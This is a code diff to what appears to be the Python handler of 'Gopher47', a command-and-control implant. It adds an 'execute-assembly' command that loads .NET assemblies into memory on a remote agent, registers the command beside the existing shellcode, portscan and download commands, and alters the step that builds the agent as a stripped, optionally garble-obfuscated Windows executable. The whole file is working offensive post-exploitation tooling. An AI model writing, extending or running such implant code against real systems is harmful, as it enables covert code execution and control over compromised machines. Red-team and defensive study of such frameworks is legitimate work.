@@ -4,6 +4,7 @@ from os.path import join
 from os import system
 from base64 import b64decode, b64encode
 import re
+import traceback
 
 # ====================
 # BEGIN COMMANDS
@@ -167,6 +168,35 @@ class CommandShellcode(Command):
         packer.add_data(f"shellcode {arguments['shellcode']}")
         return packer.buffer
 
+class CommandExecuteAssembly(Command):
+    Name = "execute-assembly"
+    Description = "Load a .NET assembly into memory to be executed."
+    Help = "Usage: execute-assembly /path/to/assembly.exe --flag arg\n Example: execute-assembly /opt/assemblies/Seatbelt.exe -group=user"
+    NeedAdmin = False
+    Mitr = []
+    Params = [
+        CommandParam(
+            name="local_path",
+            is_file_path=True,
+            is_optional=False
+        ),
+        CommandParam(
+            name="args",
+            is_file_path=False,
+            is_optional=False,
+        )
+    ]
+    
+    def job_generate(self, arguments:dict) -> bytes:
+        try:
+            args = " ".join(arguments['CommandLine'].split(" ")[2:])
+        except Exception:
+            args = arguments['args']
+        print("[*] job generate")
+        packer = Packer()
+        packer.add_data(f"execute-assembly {arguments['local_path']};{args}")
+        return packer.buffer
+
 class CommandExit(Command):
     Name        = "o7"
     Description = "just tells the agent to exit"
@@ -221,6 +251,7 @@ class Gopher47(AgentType):
         CommandDownload(),
         CommandPortscan(),
         CommandShellcode(),
+        CommandExecuteAssembly(),
         CommandExit()
     ]
 
@@ -302,20 +333,20 @@ class Gopher47(AgentType):
                 compile_cmd = "garble"
 
             if config["Config"].get('Minimize Binary Size?'):
-                make_small = "-ldflags=\"-w -s\" -gcflags=all=-l"
+                make_small = "-gcflags=all=-l"
 
             if config["Options"].get('Format') == "Windows Executable":
                 os_target = "windows"
                 ext = ".exe"
-
-            system(f"GOOS={os_target} GOARCH=amd64 {compile_cmd} build -o bin/gopher47{ext} {make_small}")
+            build_cmd = f"GOOS={os_target} GOARCH=amd64 {compile_cmd} build -o bin/gopher47{ext} -ldflags=\"-w -s\" {make_small}"
+            self.builder_send_message( config[ 'ClientID' ], "Info", f"Build Command: {build_cmd}" )
+            system(build_cmd)
             
             with open(join("bin", f"gopher47{ext}"), 'rb') as fd:
                 dat = fd.read()
                 self.builder_send_payload(config["ClientID"], f"{self.Name}{ext}", dat)
 
         except Exception as e:
-            import traceback
             self.builder_send_message( config[ 'ClientID' ], "Error", f"There was a build error: {traceback.format_exc()}" )
             self.builder_send_payload( config[ 'ClientID' ], "cancel this pls", b'probably your fault tbh' )
     
